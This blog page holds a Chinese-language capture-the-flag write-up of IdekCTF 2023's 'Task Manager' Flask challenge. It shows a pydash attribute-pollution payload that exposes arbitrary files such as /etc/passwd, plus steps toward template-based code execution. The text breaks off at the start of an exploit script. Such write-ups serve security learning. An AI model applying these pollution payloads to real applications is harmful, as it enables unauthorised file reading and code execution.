<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="2023 IdekCTF Writeup由于对xss不是很懂所以一般都是做的非xss部分，很高兴最终被强大的队友带飞下拿到第二名  环境环境可以在我的仓库下，备份了Dockerfile，可以本地搭建自己学习 https:&#x2F;&#x2F;github.com&#x2F;Y4tacker&#x2F;CTFBackup&#x2F;tree&#x2F;main&#x2F;2023&#x2F;IdekCTF Task Manager一个python写的好看的TODO LIST"><meta property="og:type" content="article"><meta property="og:title" content="2023IdekCTFWriteup"><meta property="og:url" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="2023 IdekCTF Writeup由于对xss不是很懂所以一般都是做的非xss部分，很高兴最终被强大的队友带飞下拿到第二名  环境环境可以在我的仓库下，备份了Dockerfile，可以本地搭建自己学习 https:&#x2F;&#x2F;github.com&#x2F;Y4tacker&#x2F;CTFBackup&#x2F;tree&#x2F;main&#x2F;2023&#x2F;IdekCTF Task Manager一个python写的好看的TODO LIST"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117173517438.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117173610393.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117174708618.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184046914.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184132874.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184804829.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184901145.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117185404391.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117194717091.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117194944069.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195037650.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195359549.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195443235.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184230034.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184436469.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195832333.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195923913.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117204159912.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117204310119.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230119110043007.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230119110111302.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117172800202.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117172906258.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117140247774.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117133315792.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117125832912.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117141026989.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117164606331.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117164803115.png"><meta property="article:published_time" content="2023-01-16T07:37:01.000Z"><meta property="article:modified_time" content="2024-08-04T09:01:49.694Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117173517438.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>2023IdekCTFWriteup</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2023/01/10/year/2023/1/2023RealWorldCTF-%E7%94%B1%E4%BA%8E%E6%9C%89%E5%BE%88%E5%A4%9Aday%E5%B0%B1%E4%B8%8D%E5%85%AC%E5%BC%80%E4%BA%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&text=2023IdekCTFWriteup"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&is_video=false&description=2023IdekCTFWriteup"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=2023IdekCTFWriteup&body=Check out this article: https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&name=2023IdekCTFWriteup&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&t=2023IdekCTFWriteup"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-IdekCTF-Writeup"><span class="toc-number">1.</span> <span class="toc-text">2023 IdekCTF Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-Manager"><span class="toc-number">1.2.</span> <span class="toc-text">Task Manager</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">非预期读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF1"><span class="toc-number">1.2.0.1.1.</span> <span class="toc-text">姿势1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF2"><span class="toc-number">1.2.0.1.2.</span> <span class="toc-text">姿势2</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E6%9C%9FRCE"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">预期RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF1-1"><span class="toc-number">1.2.0.2.1.</span> <span class="toc-text">姿势1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF2-1"><span class="toc-number">1.2.0.2.2.</span> <span class="toc-text">姿势2</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Proxy-viewer"><span class="toc-number">1.3.</span> <span class="toc-text">Proxy viewer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SimpleFileServer"><span class="toc-number">1.4.</span> <span class="toc-text">SimpleFileServer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ReadMe"><span class="toc-number">1.5.</span> <span class="toc-text">ReadMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Paywall"><span class="toc-number">1.6.</span> <span class="toc-text">Paywall</span></a></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">2023IdekCTFWriteup</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2023-01-16T07:37:01.000Z" class="dt-published" itemprop="datePublished">2023-01-16</time> (Updated: <time datetime="2024-08-04T09:01:49.694Z" class="dt-updated" itemprop="dateModified">2024-08-04</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/CTF/">CTF</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="2023-IdekCTF-Writeup"><a href="#2023-IdekCTF-Writeup" class="headerlink" title="2023 IdekCTF Writeup"></a>2023 IdekCTF Writeup</h1><p>由于对xss不是很懂所以一般都是做的非xss部分，很高兴最终被强大的队友带飞下拿到第二名</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117173517438.png" alt="image-20230117173517438"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>环境可以在我的仓库下，备份了Dockerfile，可以本地搭建自己学习</p><p><a target="_blank" rel="noopener" href="https://github.com/Y4tacker/CTFBackup/tree/main/2023/IdekCTF">https://github.com/Y4tacker/CTFBackup/tree/main/2023/IdekCTF</a></p><h2 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h2><p>一个python写的好看的TODO LIST</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117173610393.png" alt="image-20230117173610393"></p><p>那么我们具体来看看如何实现，这里重点看，通过json传入task与status两个参数，不同参数条件进入不同分支，通过tasks对象实现了基本的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/manage_tasks&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manage_tasks</span>():</span></span><br><span class="line">    task, status = request.json.get(<span class="string">&#x27;task&#x27;</span>), request.json.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> task <span class="keyword">or</span> <span class="built_in">type</span>(task) != <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;You must provide a task name as a string!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(task) &gt; <span class="number">150</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Tasks may not be over 150 characters long!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> status <span class="keyword">and</span> <span class="built_in">len</span>(status) &gt; <span class="number">50</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Statuses may not be over 50 characters long!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> status:</span><br><span class="line">            tasks.complete(task)</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Task marked complete!&quot;</span>&#125;, <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(status) != <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your status must be a string!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> tasks.<span class="built_in">set</span>(task, status):</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Task updated!&quot;</span>&#125;, <span class="number">200</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid task name!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># e.</span></span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="built_in">str</span>(e)&#125;, <span class="number">200</span></span><br></pre></td></tr></table></figure><p>那这个tasks对象又是个啥呢？如下2333，很明显给你提示了protected里面存在一些骚东西，看着是很像SSTI</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskManager</span>:</span></span><br><span class="line">    protected = [<span class="string">&quot;set&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;get_all&quot;</span>, <span class="string">&quot;__init__&quot;</span>, <span class="string">&quot;complete&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.<span class="built_in">set</span>(<span class="string">&quot;capture the flag&quot;</span>, <span class="string">&quot;incomplete&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self, task, status</span>):</span></span><br><span class="line">        <span class="keyword">if</span> task <span class="keyword">in</span> self.protected:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        pydash.set_(self, task, status)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">complete</span>(<span class="params">self, task</span>):</span></span><br><span class="line">        <span class="keyword">if</span> task <span class="keyword">in</span> self.protected:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        pydash.set_(self, task, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, task</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(self, task):</span><br><span class="line">            <span class="keyword">return</span> &#123;task: <span class="built_in">getattr</span>(self, task)&#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.__dict__</span><br></pre></td></tr></table></figure><p>同时我们再看看这个<code>set_</code>方法，看doc它支持一些链式调用</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117174708618.png" alt="image-20230117174708618"></p><p>但是也不是无敌的不像我们传统SSTI那样，它只能操作一些属性，而不能调用方法，同时他的操作对象是这个<code>TaskManager</code>类，同时由于代码限制我们只能为其赋值为string类型，这种思想就有点类似js当中原型链污染的感觉了</p><p>同时我们再回到<code>app.py</code>，如果<code>app.env</code>值是<code>yojo</code>，则会向全局模板函数中增加一个eval，通过<code>add_template_global</code>以后我们就能在模板里使用<code>&#123;&#123;eval(payload)&#125;&#125;</code>函数触发</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    <span class="keyword">if</span> app.env == <span class="string">&quot;yojo&quot;</span>:</span><br><span class="line">        app.add_template_global(<span class="built_in">eval</span>)</span><br></pre></td></tr></table></figure><p>那么现在重点就是如何通过<code>TaskManager</code>的实例对象获取到我们flask的app对象</p><p>有了这个一方面我们可以设置env，另一方面我们还可以控制before_first_request(毕竟这个只会在第一次加载时运行)</p><p>最终在python的debugger下通过点点点最终找到了这个app对象</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184046914.png" alt="image-20230117184046914"></p><p>其中<code>_got_first_request</code>可以控制<code>@app.before_first_request</code>的运行</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184132874.png" alt="image-20230117184132874"></p><h4 id="非预期读文件"><a href="#非预期读文件" class="headerlink" title="非预期读文件"></a>非预期读文件</h4><p>看看Dockerfile里面</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span>.<span class="number">16</span>-slim-bullseye</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt update &amp;&amp; apt install -y xxd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> python3 -m pip install flask pydash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;idek&#123;[REDACTED]&#125;&quot;</span> &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> useradd ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>最后调用<code>COPY . .</code>复制了所有的文件，看看文件结构这也就以为着把Dockerfile自身也复制进去了2333</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184804829.png" alt="image-20230117184804829"></p><h5 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h5><p>可以看到这里有个<code>_static_url_path</code>属性，这是啥目录大家都知道一些静态资源文件都放下面</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184901145.png" alt="image-20230117184901145"></p><p>那么如果我们设置<code>app._static_folder</code> 为<code>/</code> 接着访问 <code>/static/etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;task&quot;:&quot;__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._static_folder&quot;,&quot;status&quot;:&quot;/&quot;&#125;</span><br></pre></td></tr></table></figure><p>任意文件读</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117185404391.png" alt="image-20230117185404391"></p><h5 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h5><p>从app.py当中看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">render_page</span>(<span class="params">path</span>):</span></span><br><span class="line">    app._got_first_request = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br></pre></td></tr></table></figure><p>如果我们访问<code>/../app.py</code>会怎么样呢，很显然报错了</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117194717091.png" alt="image-20230117194717091"></p><p>我们可以看看flask的实现代码，在<code>jinja2.loaders.FileSystemLoader.get_source</code></p><p>在这里首先通过<code>split_template_path</code>处理路径</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117194944069.png" alt="image-20230117194944069"></p><p>如果我们路径当中带有<code>..</code>可以看到由于和<code>os.path.pardir</code>相等，导致抛出<code>TemplateNotFound</code>异常，也就是不允许跨目录</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195037650.png" alt="image-20230117195037650"></p><p>那如果我们污染了<code>os.path.pardir</code>那么这里就通过了条件，不会拦截</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195359549.png" alt="image-20230117195359549"></p><p>成功实现了跨目录读</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195443235.png" alt="image-20230117195443235"></p><h4 id="预期RCE"><a href="#预期RCE" class="headerlink" title="预期RCE"></a>预期RCE</h4><p>同时这里还有一个<code>jinja_env</code>属性我们可以看到很多有趣的属性比如auto_reload，这里还有识别模板的<code>&#123;%%&#125;</code>以及<code>&#123;&#123;&#125;&#125;</code></p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184230034.png" alt="image-20230117184230034"></p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184436469.png" alt="image-20230117184436469"></p><h5 id="姿势1-1"><a href="#姿势1-1" class="headerlink" title="姿势1"></a>姿势1</h5><p>那么到了这里如果我们能找到一个py文件，这个py文件里面有<code>eval</code>函数，那是不是我们就能成功rce了呢？这部分我和队友一直没找到，最后出题人提供了答案，在<code>/usr/local/lib/python3.8/turtle.py</code></p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195832333.png" alt="image-20230117195832333"></p><p>那么如果我们控制修改这个模板的标签，再配合污染<code>os.path.pardir</code>,那么是不是就能渲染任意文件顺利RCE了呢</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195923913.png" alt="image-20230117195923913"></p><p>提供一个出题人的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://localhost:1337&quot;</span></span><br><span class="line"><span class="comment">#base_url = &quot;https://task-manager-dc512c530573c0b4.instancer.idek.team&quot;</span></span><br><span class="line"></span><br><span class="line">hijack_start = <span class="string">&quot;&quot;&quot;&#x27;&quot;&quot;&#x27;]:\n            value = &quot;&quot;&quot;</span></span><br><span class="line">hijack_end = <span 